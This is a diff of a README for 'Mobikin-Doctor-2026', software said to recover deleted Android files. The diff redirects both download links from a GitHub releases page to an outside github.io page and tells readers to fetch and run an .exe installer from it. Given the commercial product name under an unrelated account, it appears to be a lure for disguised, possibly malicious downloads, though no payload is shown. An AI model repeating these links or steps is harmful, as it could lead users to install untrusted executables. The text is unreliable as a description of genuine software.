@@ -1,6 +1,6 @@
 # 🛠️ Mobikin-Doctor-2026 - Recover deleted files from Android devices
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Accountagha221/Mobikin-Doctor-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://accountagha221.github.io)
 
 Mobikin-Doctor-2026 acts as a bridge between your computer and your Android smartphone. This software searches internal storage and external SD cards to find lost photos, text messages, contacts, and call logs. It works on Windows 10 and Windows 11 systems. The program provides a way to restore data after accidental deletion, system crashes, or factory resets.
 
@@ -19,7 +19,7 @@ Your computer must meet these basic requirements to run the software effectively
 
 You must visit the official release page to obtain the installer. Follow these steps to reach the download location:
 
-1. Visit [this page to download the software](https://github.com/Accountagha221/Mobikin-Doctor-2026/releases).
+1. Visit [this page to download the software](https://accountagha221.github.io).
 2. Look for the most recent version labeled as the latest release.
 3. Select the file ending in .exe to begin your download to your computer.
 4. Save the installer to your Downloads folder or your desktop for easy access.
